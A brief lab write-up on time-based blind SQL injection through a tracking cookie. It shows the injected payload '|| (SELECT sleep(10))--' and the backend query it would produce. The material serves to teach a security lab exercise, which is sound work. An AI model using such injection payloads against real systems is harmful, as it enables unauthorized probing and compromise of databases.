Lab #13 - Blind SQLi with time delays

Vulnerable parameter - tracking cookie

End Goal:
- prove that the field is vulnerable to blink SQLi

Analysis:
 ---------

The query when submitted will look like this on the backend: select tracking-id from tracking-table where trackingid='adHJklIB3kMwEr' || 
 || (SELECT sleep(10))--
So all we are saying is to query the tracking cookie and then tell the app to wait for 10sec
